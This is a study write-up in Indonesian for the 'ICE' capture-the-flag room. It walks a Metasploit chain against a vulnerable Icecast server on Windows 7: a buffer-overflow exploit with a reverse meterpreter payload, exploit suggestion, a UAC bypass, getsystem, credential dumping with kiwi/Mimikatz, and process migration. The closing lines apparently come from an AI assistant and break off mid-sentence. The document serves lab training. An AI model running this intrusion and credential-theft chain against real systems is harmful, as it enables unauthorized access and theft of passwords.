# 🧊 Exploitation Notes: Room ICE (Icecast)

> **Target:** Windows 7 (Vulnerable to Icecast CVE-2004-1561)
> **Key Concepts:** Media Server Exploitation, Manual PrivEsc, Credential Dumping.

---

## 🔍 1. Enumeration & Initial Access
Target menjalankan layanan **Icecast** yang memiliki celah *Buffer Overflow*.

*   **Exploit Module:** `exploit/windows/http/icecast_header`
*   **Payload:** `windows/meterpreter/reverse_tcp`

**Pro-Tip:** Selalu cek port **8000** (default Icecast) saat melakukan pemindaian awal dengan Nmap.

---

## 🚀 2. Privilege Escalation (Local Exploit Suggester)
Di room ICE, kita masuk sebagai user biasa. Kita butuh modul bantuan untuk mencari jalan pintas menjadi SYSTEM.

1.  Background shell kamu (`CTRL + Z`).
2.  Gunakan modul scanner:
    ```bash
    use multi/recon/local_exploit_suggester
    set SESSION [ID]
    run
    
Modul ini akan memberikan daftar exploit yang bisa menaikkan akses kita (Contoh: bypassuac_eventvwr).🛠️ 3. Bypass UAC & Gaining SYSTEMSetelah menemukan exploit yang cocok, kita eksekusi untuk melewati proteksi Windows (UAC).Module: exploit/windows/local/bypassuac_eventvwrAction: Setelah modul ini sukses, kamu akan mendapatkan session baru. Di session baru ini, ketik getsystem untuk menjadi user tertinggi.🔑 4. Harvesting Credentials (Mimikatz/Kiwi)Setelah menjadi SYSTEM, kita bisa mengambil password yang tersimpan di memori (RAM).Menggunakan Extension KiwiBashload kiwi             # Memuat modul Mimikatz versi Metasploit
help kiwi             # Melihat daftar perintah kiwi
Commands Sakti:CommandDescriptioncreds_allMengambil SEMUA jenis kredensial (Password plain-text & Hash).lsa_dump_secretsMengambil rahasia dari LSA (Local Security Authority).password_changeMengganti password user tanpa tahu password lamanya.🔄 5. Process Manipulation & PersistencePenting untuk pindah ke proses yang dijalankan oleh user yang punya hak akses tinggi.Cek User Proses: psMigrasi: migrate [PID]Tip: Cari proses spoolsv.exe (Print Spooler) karena biasanya proses ini berjalan sebagai SYSTEM dan sangat stabil.🎯 6. Room Specific Checklist[ ] Berhasil exploit Icecast (Port 8000).[ ] Menemukan exploit PrivEsc lewat local_exploit_suggester.[ ] Sukses Bypass UAC.[ ] Dump password user menggunakan creds_all.Notes created for educational purposes by Sepka .
---

### Perbedaan Utama Room Blue vs ICE (Buat Catatan Kamu):
*   **Blue:** Kamu dapet SYSTEM **instan** lewat exploit kernel (EternalBlue).
*   **ICE:** Kamu masuk sebagai **User Biasa**, lalu harus kerja keras dikit lewat `local_exploit_suggester` dan `bypassuac` untuk jadi SYSTEM. Ini lebih mirip skenario serangan di dunia nyata!

Catatan ini sudah siap kamu masukin ke GitHub. Mau lanjut ke room **Steel Mountain** ata
